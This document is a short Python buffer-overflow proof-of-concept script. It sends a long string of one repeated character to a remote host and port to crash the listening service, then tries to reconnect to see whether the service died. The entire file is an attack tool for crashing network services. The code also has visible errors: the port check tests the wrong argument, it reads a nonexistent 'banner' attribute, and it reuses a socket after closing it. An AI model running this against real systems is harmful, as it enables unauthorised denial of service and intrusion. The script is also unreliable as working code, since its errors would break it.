#!/usr/bin/env python3
import socket, argparse,sys

parser = argparse.ArgumentParser(description='Simple Buffer Overflow POC')
parser.add_argument('-R','--rhost',dest='rhost',help="Set the Remote host address")
parser.add_argument('-P','--rport',dest='rport',help="Set the Remote host port")
parser.add_argument('-l','--length',dest='length',help="Length of the pattern")
parser.add_argument('-c','--char',dest='character',help="Set the Character to build pattern from")
parser.add_argument('-b','--receive-banner',action='store_true',help="Receive the banner of the application")


args = parser.parse_args()

pattern_char = "A"
receive_banner = False

if args.rhost:
    RHOST = args.rhost
else:
    print("[!] Missing Remote Address.")
    sys.exit(1)
if args.rhost:
    RPORT = int(args.rport)
else:
    print("[!] Missing Remote Port.")
    sys.exit(1)
if args.length:
    pattern_length = int(args.length)
else:
    print("[!] Missing Length of the pattern.")
    sys.exit(1)
if args.character:
    pattern_char = args.character
if args.banner:
    receive_banner = True




s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
if receive_banner:
    print(s.recv(2048))
payload = pattern_char * pattern_length
s.send(payload.encode())
s.close()
s.settimeout(5)
try:
    s.connect((RHOST,RPORT))
except Exception as x:
    print(x)
